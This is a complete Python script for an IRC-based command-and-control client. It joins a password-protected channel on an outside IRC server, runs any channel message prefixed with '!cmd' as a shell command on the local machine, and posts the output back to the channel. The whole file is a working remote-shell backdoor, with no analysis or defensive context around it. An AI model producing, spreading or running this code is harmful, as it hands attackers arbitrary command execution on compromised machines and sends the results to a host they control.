import irc.bot
import subprocess
import sys
class C2Bot(irc.bot.SingleServerIRCBot):
    def __init__(self, server, port, nickname, channel, password):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel = channel
        self.password = password

    def on_welcome(self, connection, event):
        # Join the channel and authenticate
        connection.join(self.channel, self.password)
        print(f"Joined channel: {self.channel}")

    def on_pubmsg(self, connection, event):
        # Listen for commands in the channel
        message = event.arguments[0]
        print(f"Received message: {message}")  # Debugging
        if message.startswith("!cmd"):
            # Extract the command
            command = message[len("!cmd "):]
            print(f"Executing command: {command}")  # Debugging
            # Execute the command locally
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                # Send the output back to the channel
                for line in output.decode("utf-8").splitlines():
                    connection.privmsg(self.channel, line)
                    print(f"Sent output: {line}")  # Debugging
            except Exception as e:
                error_msg = f"Error: {str(e)}"
                connection.privmsg(self.channel, error_msg)
                print(error_msg)  # Debugging

# Configuration
server = "irc.freenode.net"
port = 6667
nickname = "C2Client"
channel = input("Enter the channel>> ")
password = input("Enter the password>>")

if channel.strip() == "" and password.strip() == "":
    print("Channel and password cannot be empty. Exiting...")
    sys.exit()

# Start the bot
print("Starting C2 client...")
bot = C2Bot(server, port, nickname, channel, password)
bot.start()
